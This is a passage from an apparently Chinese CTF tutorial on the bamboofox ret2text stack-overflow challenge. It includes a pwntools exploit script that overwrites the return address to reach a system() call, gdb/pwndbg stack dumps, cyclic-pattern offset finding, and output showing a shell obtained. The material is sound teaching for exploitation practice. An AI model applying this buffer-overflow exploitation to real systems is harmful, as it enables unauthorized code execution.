+</span></span><span class=line><span class=cl>.text:08048641                 call    _system</span></span></code></pre></td></tr></table></div></div><p>这样我们就可以跳过输入随机数的代码了</p><p>如何计算偏移量呢？</p><p><img src=/imgs/img-lazy-loading.gif data-src=/imgs/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20ret2text/01.png alt="ida pro"></p><p>根据 <code>gets</code> 的参数 s 在栈中的位置可以计算出偏移量为 0x64
+即上图中的 <code>[ebp-64h]</code>, 表示当前局部变量距离栈底 0x64 字节
+<code>[esp + 1Ch]</code> 表示当前栈顶指针偏移 0x1C 字节</p><p>因为我们要覆盖返回地址，而返回地址是在 ebp + 4 处 (32 位程序), 所以偏移为 0x64</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
+</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
+</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3>3</a>
+</span><span class=lnt id=hl-5-4><a class=lnlinks href=#hl-5-4>4</a>
+</span><span class=lnt id=hl-5-5><a class=lnlinks href=#hl-5-5>5</a>
+</span><span class=lnt id=hl-5-6><a class=lnlinks href=#hl-5-6>6</a>
+</span><span class=lnt id=hl-5-7><a class=lnlinks href=#hl-5-7>7</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2text&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=mh>0x804863a</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x64</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>target</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
+</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2>2</a>
+</span><span class=lnt id=hl-6-3><a class=lnlinks href=#hl-6-3>3</a>
+</span><span class=lnt id=hl-6-4><a class=lnlinks href=#hl-6-4>4</a>
+</span><span class=lnt id=hl-6-5><a class=lnlinks href=#hl-6-5>5</a>
+</span><span class=lnt id=hl-6-6><a class=lnlinks href=#hl-6-6>6</a>
+</span><span class=lnt id=hl-6-7><a class=lnlinks href=#hl-6-7>7</a>
+</span><span class=lnt id=hl-6-8><a class=lnlinks href=#hl-6-8>8</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python exploit.py            <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./ret2text&#39;</span>: pid <span class=m>56704</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Process <span class=s1>&#39;./ret2text&#39;</span> stopped with <span class=nb>exit</span> code <span class=m>0</span> <span class=o>(</span>pid 56704<span class=o>)</span>
+</span></span><span class=line><span class=cl>There is something amazing here, <span class=k>do</span> you know anything?
+</span></span><span class=line><span class=cl>Maybe I will tell you next <span class=nb>time</span> !<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
+</span></span><span class=line><span class=cl>$ ls
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> sending in interactive</span></span></code></pre></td></tr></table></div></div><p>但是程序 EOF 了，证明偏移量可能测算错误了</p><div class=post-alert-warning><div class=post-alert-title><i class="fa-solid fa-triangle-exclamation"></i>
+<span>栈对齐问题只发生在 64 位程序中</span></div><div class=post-alert-content></div></div><p>修改源程序</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1> 1</a>
+</span><span class=lnt id=hl-7-2><a class=lnlinks href=#hl-7-2> 2</a>
+</span><span class=lnt id=hl-7-3><a class=lnlinks href=#hl-7-3> 3</a>
+</span><span class=lnt id=hl-7-4><a class=lnlinks href=#hl-7-4> 4</a>
+</span><span class=lnt id=hl-7-5><a class=lnlinks href=#hl-7-5> 5</a>
+</span><span class=lnt id=hl-7-6><a class=lnlinks href=#hl-7-6> 6</a>
+</span><span class=lnt id=hl-7-7><a class=lnlinks href=#hl-7-7> 7</a>
+</span><span class=lnt id=hl-7-8><a class=lnlinks href=#hl-7-8> 8</a>
+</span><span class=lnt id=hl-7-9><a class=lnlinks href=#hl-7-9> 9</a>
+</span><span class=lnt id=hl-7-10><a class=lnlinks href=#hl-7-10>10</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;kitty&#34;</span><span class=p>,</span> <span class=s2>&#34;@&#34;</span><span class=p>,</span> <span class=s2>&#34;launch&#34;</span><span class=p>,</span> <span class=s2>&#34;--type=window&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2text&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=mh>0x804863a</span>
+</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x64</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>target</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p><code>gdb.attach(sh)</code> 可以在程序运行时附加 gdb 调试器</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1> 1</a>
+</span><span class=lnt id=hl-8-2><a class=lnlinks href=#hl-8-2> 2</a>
+</span><span class=lnt id=hl-8-3><a class=lnlinks href=#hl-8-3> 3</a>
+</span><span class=lnt id=hl-8-4><a class=lnlinks href=#hl-8-4> 4</a>
+</span><span class=lnt id=hl-8-5><a class=lnlinks href=#hl-8-5> 5</a>
+</span><span class=lnt id=hl-8-6><a class=lnlinks href=#hl-8-6> 6</a>
+</span><span class=lnt id=hl-8-7><a class=lnlinks href=#hl-8-7> 7</a>
+</span><span class=lnt id=hl-8-8><a class=lnlinks href=#hl-8-8> 8</a>
+</span><span class=lnt id=hl-8-9><a class=lnlinks href=#hl-8-9> 9</a>
+</span><span class=lnt id=hl-8-10><a class=lnlinks href=#hl-8-10>10</a>
+</span><span class=lnt id=hl-8-11><a class=lnlinks href=#hl-8-11>11</a>
+</span><span class=lnt id=hl-8-12><a class=lnlinks href=#hl-8-12>12</a>
+</span><span class=lnt id=hl-8-13><a class=lnlinks href=#hl-8-13>13</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; stack <span class=m>50</span>
+</span></span><span class=line><span class=cl>00:0000│ esp 0xff9070e0 —▸ 0xff9070fc ◂— 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>01:0004│-084 0xff9070e4 ◂— <span class=m>0</span>
+</span></span><span class=line><span class=cl>02:0008│-080 0xff9070e8 ◂— <span class=m>1</span>
+</span></span><span class=line><span class=cl>03:000c│-07c 0xff9070ec ◂— <span class=m>0</span>
+</span></span><span class=line><span class=cl>04:0010│-078 0xff9070f0 ◂— <span class=m>0</span>
+</span></span><span class=line><span class=cl>05:0014│-074 0xff9070f4 ◂— <span class=m>1</span>
+</span></span><span class=line><span class=cl>06:0018│-070 0xff9070f8 —▸ 0xf7f6ea60 ◂— <span class=m>0</span>
+</span></span><span class=line><span class=cl>07:001c│ eax 0xff9070fc ◂— 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>... ↓        <span class=m>25</span> skipped
+</span></span><span class=line><span class=cl>21:0084│-004 0xff907164 —▸ 0x804863a <span class=o>(</span>secure+61<span class=o>)</span> ◂— mov dword ptr <span class=o>[</span>esp<span class=o>]</span>, 0x8048763
+</span></span><span class=line><span class=cl>22:0088│ ebp 0xff907168 —▸ 0xf7f6db00 ◂— <span class=m>0</span>
+</span></span><span class=line><span class=cl>23:008c│+004 0xff90716c —▸ 0xf7cd2575 ◂— add esp, 0x10</span></span></code></pre></td></tr></table></div></div><p>返回地址在 ebp + 4 处, 但是我们只覆盖到了 ebp - 0x8 处，所以修正好的偏移量是 0x64 + 0x8 = 0x6c</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-9-1><a class=lnlinks href=#hl-9-1>1</a>
+</span><span class=lnt id=hl-9-2><a class=lnlinks href=#hl-9-2>2</a>
+</span><span class=lnt id=hl-9-3><a class=lnlinks href=#hl-9-3>3</a>
+</span><span class=lnt id=hl-9-4><a class=lnlinks href=#hl-9-4>4</a>
+</span><span class=lnt id=hl-9-5><a class=lnlinks href=#hl-9-5>5</a>
+</span><span class=lnt id=hl-9-6><a class=lnlinks href=#hl-9-6>6</a>
+</span><span class=lnt id=hl-9-7><a class=lnlinks href=#hl-9-7>7</a>
+</span><span class=lnt id=hl-9-8><a class=lnlinks href=#hl-9-8>8</a>
+</span><span class=lnt id=hl-9-9><a class=lnlinks href=#hl-9-9>9</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>~/</span><span class=n>P</span><span class=o>/</span><span class=n>c</span><span class=o>/</span><span class=n>p</span><span class=o>/</span><span class=n>l</span><span class=o>/</span><span class=n>u</span><span class=o>/</span><span class=n>s</span><span class=o>/</span><span class=n>r</span><span class=o>/</span><span class=n>bamboofox</span><span class=o>-</span><span class=n>ret2text</span> <span class=err>❯❯❯</span> <span class=n>python</span> <span class=n>exploit</span><span class=o>.</span><span class=n>py</span>            <span class=p>(</span><span class=o>.</span><span class=n>venv</span><span class=p>)</span> <span class=n>master</span> <span class=err>✱</span> <span class=err>◼</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Starting</span> <span class=n>local</span> <span class=n>process</span> <span class=s1>&#39;./ret2text&#39;</span><span class=p>:</span> <span class=n>pid</span> <span class=mi>59090</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=n>There</span> <span class=ow>is</span> <span class=n>something</span> <span class=n>amazing</span> <span class=n>here</span><span class=p>,</span> <span class=n>do</span> <span class=n>you</span> <span class=n>know</span> <span class=n>anything</span><span class=err>?</span>
+</span></span><span class=line><span class=cl><span class=n>Maybe</span> <span class=n>I</span> <span class=n>will</span> <span class=n>tell</span> <span class=n>you</span> <span class=nb>next</span> <span class=n>time</span> <span class=err>!$</span> <span class=n>whoami</span>
+</span></span><span class=line><span class=cl><span class=n>lhon901</span>
+</span></span><span class=line><span class=cl><span class=err>$</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Interrupted</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Stopped</span> <span class=n>process</span> <span class=s1>&#39;./ret2text&#39;</span> <span class=p>(</span><span class=n>pid</span> <span class=mi>59090</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>攻击成功</p><h3 id=使用-gdb-来获取偏移>使用 gdb 来获取偏移
+<a class=header-anchor href=#%e4%bd%bf%e7%94%a8-gdb-%e6%9d%a5%e8%8e%b7%e5%8f%96%e5%81%8f%e7%a7%bb></a></h3><p>使用 ida pro 获取偏移量可能会不正确，我们可以使用动态调试来准确获得偏移量</p><p>先使用 <code>pwn cyclic</code> 命令来获取测试用的字符串</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-10-1><a class=lnlinks href=#hl-10-1>1</a>
+</span><span class=lnt id=hl-10-2><a class=lnlinks href=#hl-10-2>2</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ pwn cyclic <span class=m>500</span>               <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span></span></code></pre></td></tr></table></div></div><p>使用 gdb 开始调试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-11-1><a class=lnlinks href=#hl-11-1> 1</a>
+</span><span class=lnt id=hl-11-2><a class=lnlinks href=#hl-11-2> 2</a>
+</span><span class=lnt id=hl-11-3><a class=lnlinks href=#hl-11-3> 3</a>
+</span><span class=lnt id=hl-11-4><a class=lnlinks href=#hl-11-4> 4</a>
+</span><span class=lnt id=hl-11-5><a class=lnlinks href=#hl-11-5> 5</a>
+</span><span class=lnt id=hl-11-6><a class=lnlinks href=#hl-11-6> 6</a>
+</span><span class=lnt id=hl-11-7><a class=lnlinks href=#hl-11-7> 7</a>
+</span><span class=lnt id=hl-11-8><a class=lnlinks href=#hl-11-8> 8</a>
+</span><span class=lnt id=hl-11-9><a class=lnlinks href=#hl-11-9> 9</a>
+</span><span class=lnt id=hl-11-10><a class=lnlinks href=#hl-11-10>10</a>
+</span><span class=lnt id=hl-11-11><a class=lnlinks href=#hl-11-11>11</a>
+</span><span class=lnt id=hl-11-12><a class=lnlinks href=#hl-11-12>12</a>
+</span><span class=lnt id=hl-11-13><a class=lnlinks href=#hl-11-13>13</a>
+</span><span class=lnt id=hl-11-14><a class=lnlinks href=#hl-11-14>14</a>
+</span><span class=lnt id=hl-11-15><a class=lnlinks href=#hl-11-15>15</a>
+</span><span class=lnt id=hl-11-16><a class=lnlinks href=#hl-11-16>16</a>
+</span><span class=lnt id=hl-11-17><a class=lnlinks href=#hl-11-17>17</a>
+</span><span class=lnt id=hl-11-18><a class=lnlinks href=#hl-11-18>18</a>
+</span><span class=lnt id=hl-11-19><a class=lnlinks href=#hl-11-19>19</a>
+</span><span class=lnt id=hl-11-20><a class=lnlinks href=#hl-11-20>20</a>
+</span><span class=lnt id=hl-11-21><a class=lnlinks href=#hl-11-21>21</a>
+</span><span class=lnt id=hl-11-22><a class=lnlinks href=#hl-11-22>22</a>
+</span><span class=lnt id=hl-11-23><a class=lnlinks href=#hl-11-23>23</a>
+</span><span class=lnt id=hl-11-24><a class=lnlinks href=#hl-11-24>24</a>
+</span><span class=lnt id=hl-11-25><a class=lnlinks href=#hl-11-25>25</a>
+</span><span class=lnt id=hl-11-26><a class=lnlinks href=#hl-11-26>26</a>
+</span><span class=lnt id=hl-11-27><a class=lnlinks href=#hl-11-27>27</a>
+</span><span class=lnt id=hl-11-28><a class=lnlinks href=#hl-11-28>28</a>
+</span><span class=lnt id=hl-11-29><a class=lnlinks href=#hl-11-29>29</a>
+</span><span class=lnt id=hl-11-30><a class=lnlinks href=#hl-11-30>30</a>
+</span><span class=lnt id=hl-11-31><a class=lnlinks href=#hl-11-31>31</a>
+</span><span class=lnt id=hl-11-32><a class=lnlinks href=#hl-11-32>32</a>
+</span><span class=lnt id=hl-11-33><a class=lnlinks href=#hl-11-33>33</a>
+</span><span class=lnt id=hl-11-34><a class=lnlinks href=#hl-11-34>34</a>
+</span><span class=lnt id=hl-11-35><a class=lnlinks href=#hl-11-35>35</a>
+</span><span class=lnt id=hl-11-36><a class=lnlinks href=#hl-11-36>36</a>
+</span><span class=lnt id=hl-11-37><a class=lnlinks href=#hl-11-37>37</a>
+</span><span class=lnt id=hl-11-38><a class=lnlinks href=#hl-11-38>38</a>
+</span><span class=lnt id=hl-11-39><a class=lnlinks href=#hl-11-39>39</a>
+</span><span class=lnt id=hl-11-40><a class=lnlinks href=#hl-11-40>40</a>
+</span><span class=lnt id=hl-11-41><a class=lnlinks href=#hl-11-41>41</a>
+</span><span class=lnt id=hl-11-42><a class=lnlinks href=#hl-11-42>42</a>
+</span><span class=lnt id=hl-11-43><a class=lnlinks href=#hl-11-43>43</a>
+</span><span class=lnt id=hl-11-44><a class=lnlinks href=#hl-11-44>44</a>
+</span><span class=lnt id=hl-11-45><a class=lnlinks href=#hl-11-45>45</a>
+</span><span class=lnt id=hl-11-46><a class=lnlinks href=#hl-11-46>46</a>
+</span><span class=lnt id=hl-11-47><a class=lnlinks href=#hl-11-47>47</a>
+</span><span class=lnt id=hl-11-48><a class=lnlinks href=#hl-11-48>48</a>
+</span><span class=lnt id=hl-11-49><a class=lnlinks href=#hl-11-49>49</a>
+</span><span class=lnt id=hl-11-50><a class=lnlinks href=#hl-11-50>50</a>
+</span><span class=lnt id=hl-11-51><a class=lnlinks href=#hl-11-51>51</a>
+</span><span class=lnt id=hl-11-52><a class=lnlinks href=#hl-11-52>52</a>
+</span><span class=lnt id=hl-11-53><a class=lnlinks href=#hl-11-53>53</a>
+</span><span class=lnt id=hl-11-54><a class=lnlinks href=#hl-11-54>54</a>
+</span><span class=lnt id=hl-11-55><a class=lnlinks href=#hl-11-55>55</a>
+</span><span class=lnt id=hl-11-56><a class=lnlinks href=#hl-11-56>56</a>
+</span><span class=lnt id=hl-11-57><a class=lnlinks href=#hl-11-57>57</a>
+</span><span class=lnt id=hl-11-58><a class=lnlinks href=#hl-11-58>58</a>
+</span><span class=lnt id=hl-11-59><a class=lnlinks href=#hl-11-59>59</a>
+</span><span class=lnt id=hl-11-60><a class=lnlinks href=#hl-11-60>60</a>
+</span><span class=lnt id=hl-11-61><a class=lnlinks href=#hl-11-61>61</a>
+</span><span class=lnt id=hl-11-62><a class=lnlinks href=#hl-11-62>62</a>
+</span><span class=lnt id=hl-11-63><a class=lnlinks href=#hl-11-63>63</a>
+</span><span class=lnt id=hl-11-64><a class=lnlinks href=#hl-11-64>64</a>
+</span><span class=lnt id=hl-11-65><a class=lnlinks href=#hl-11-65>65</a>
+</span><span class=lnt id=hl-11-66><a class=lnlinks href=#hl-11-66>66</a>
+</span><span class=lnt id=hl-11-67><a class=lnlinks href=#hl-11-67>67</a>
+</span><span class=lnt id=hl-11-68><a class=lnlinks href=#hl-11-68>68</a>
+</span><span class=lnt id=hl-11-69><a class=lnlinks href=#hl-11-69>69</a>
+</span><span class=lnt id=hl-11-70><a class=lnlinks href=#hl-11-70>70</a>
+</span><span class=lnt id=hl-11-71><a class=lnlinks href=#hl-11-71>71</a>
+</span><span class=lnt id=hl-11-72><a class=lnlinks href=#hl-11-72>72</a>
+</span><span class=lnt id=hl-11-73><a class=lnlinks href=#hl-11-73>73</a>
+</span><span class=lnt id=hl-11-74><a class=lnlinks href=#hl-11-74>74</a>
+</span><span class=lnt id=hl-11-75><a class=lnlinks href=#hl-11-75>75</a>
+</span><span class=lnt id=hl-11-76><a class=lnlinks href=#hl-11-76>76</a>
+</span><span class=lnt id=hl-11-77><a class=lnlinks href=#hl-11-77>77</a>
+</span><span class=lnt id=hl-11-78><a class=lnlinks href=#hl-11-78>78</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ gdb ./ret2text               <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl>GNU gdb <span class=o>(</span>GDB<span class=o>)</span> 16.3
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> <span class=m>2024</span> Free Software Foundation, Inc.
+</span></span><span class=line><span class=cl>License GPLv3+: GNU GPL version <span class=m>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span class=line><span class=cl>This is free software: you are free to change and redistribute it.
+</span></span><span class=line><span class=cl>There is NO WARRANTY, to the extent permitted by law.
+</span></span><span class=line><span class=cl>Type <span class=s2>&#34;show copying&#34;</span> and <span class=s2>&#34;show warranty&#34;</span> <span class=k>for</span> details.
+</span></span><span class=line><span class=cl>This GDB was configured as <span class=s2>&#34;x86_64-pc-linux-gnu&#34;</span>.
+</span></span><span class=line><span class=cl>Type <span class=s2>&#34;show configuration&#34;</span> <span class=k>for</span> configuration details.
+</span></span><span class=line><span class=cl>For bug reporting instructions, please see:
+</span></span><span class=line><span class=cl>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+</span></span><span class=line><span class=cl>Find the GDB manual and other documentation resources online at:
+</span></span><span class=line><span class=cl>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>For help, <span class=nb>type</span> <span class=s2>&#34;help&#34;</span>.
+</span></span><span class=line><span class=cl>Type <span class=s2>&#34;apropos word&#34;</span> to search <span class=k>for</span> commands related to <span class=s2>&#34;word&#34;</span>...
+</span></span><span class=line><span class=cl>pwndbg: loaded <span class=m>188</span> pwndbg commands and <span class=m>42</span> shell commands. Type pwndbg <span class=o>[</span>--shell <span class=p>|</span> --all<span class=o>]</span> <span class=o>[</span>filter<span class=o>]</span> <span class=k>for</span> a list.
+</span></span><span class=line><span class=cl>pwndbg: created <span class=nv>$rebase</span>, <span class=nv>$base</span>, <span class=nv>$hex2ptr</span>, <span class=nv>$argv</span>, <span class=nv>$envp</span>, <span class=nv>$argc</span>, <span class=nv>$environ</span>, <span class=nv>$bn_sym</span>, <span class=nv>$bn_var</span>, <span class=nv>$bn_eval</span>, <span class=nv>$ida</span> GDB functions <span class=o>(</span>can be used with print/break<span class=o>)</span>
+</span></span><span class=line><span class=cl>Reading symbols from ./ret2text...
+</span></span><span class=line><span class=cl>------- tip of the day <span class=o>(</span>disable with <span class=nb>set</span> show-tips off<span class=o>)</span> -------
+</span></span><span class=line><span class=cl>Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with <span class=nb>set</span> emulate off which may also speed up debugging
+</span></span><span class=line><span class=cl>pwndbg&gt; r
+</span></span><span class=line><span class=cl>Starting program: /home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>This GDB supports auto-downloading debuginfo from the following URLs:
+</span></span><span class=line><span class=cl>  &lt;https://debuginfod.archlinux.org&gt;
+</span></span><span class=line><span class=cl>Debuginfod has been disabled.
+</span></span><span class=line><span class=cl>To make this setting permanent, add <span class=s1>&#39;set debuginfod enabled off&#39;</span> to .gdbinit.
+</span></span><span class=line><span class=cl><span class=o>[</span>Thread debugging using libthread_db enabled<span class=o>]</span>
+</span></span><span class=line><span class=cl>Using host libthread_db library <span class=s2>&#34;/usr/lib/libthread_db.so.1&#34;</span>.
+</span></span><span class=line><span class=cl>There is something amazing here, <span class=k>do</span> you know anything?
+</span></span><span class=line><span class=cl>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
+</span></span><span class=line><span class=cl>Maybe I will tell you next <span class=nb>time</span> !
+</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
+</span></span><span class=line><span class=cl>0x62616164 in ?? <span class=o>()</span>
+</span></span><span class=line><span class=cl>LEGEND: STACK <span class=p>|</span> HEAP <span class=p>|</span> CODE <span class=p>|</span> DATA <span class=p>|</span> WX <span class=p>|</span> RODATA
+</span></span><span class=line><span class=cl>────────────────<span class=o>[</span> REGISTERS / show-flags off / show-compact-regs off <span class=o>]</span>─────────────────
+</span></span><span class=line><span class=cl> EAX  <span class=m>0</span>
+</span></span><span class=line><span class=cl> EBX  0xf7f6ae0c ◂— 0x22bd2c
+</span></span><span class=line><span class=cl> ECX  <span class=m>0</span>
+</span></span><span class=line><span class=cl> EDX  <span class=m>0</span>
+</span></span><span class=line><span class=cl> EDI  0x80486d0 <span class=o>(</span>__libc_csu_init<span class=o>)</span> ◂— push ebp
+</span></span><span class=line><span class=cl> ESI  <span class=m>0</span>
+</span></span><span class=line><span class=cl> EBP  0x62616163 <span class=o>(</span><span class=s1>&#39;caab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl> ESP  0xffffcc80 ◂— 0x62616165 <span class=o>(</span><span class=s1>&#39;eaab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl> EIP  0x62616164 <span class=o>(</span><span class=s1>&#39;daab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>──────────────────────────<span class=o>[</span> DISASM / i386 / <span class=nb>set</span> emulate on <span class=o>]</span>───────────────────────────
+</span></span><span class=line><span class=cl>Invalid address 0x62616164
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>───────────────────────────────────────<span class=o>[</span> STACK <span class=o>]</span>───────────────────────────────────────
+</span></span><span class=line><span class=cl>00:0000│ esp 0xffffcc80 ◂— 0x62616165 <span class=o>(</span><span class=s1>&#39;eaab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>01:0004│     0xffffcc84 ◂— 0x62616166 <span class=o>(</span><span class=s1>&#39;faab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>02:0008│     0xffffcc88 ◂— 0x62616167 <span class=o>(</span><span class=s1>&#39;gaab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>03:000c│     0xffffcc8c ◂— 0x62616168 <span class=o>(</span><span class=s1>&#39;haab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>04:0010│     0xffffcc90 ◂— 0x62616169 <span class=o>(</span><span class=s1>&#39;iaab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>05:0014│     0xffffcc94 ◂— 0x6261616a <span class=o>(</span><span class=s1>&#39;jaab&#39;</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>06:0018│     0xffffcc98 ◂— 0x6261616b <span class=o>(</span><span class=s1>&#39;kaab&#39;</span><span class=o>)</span>
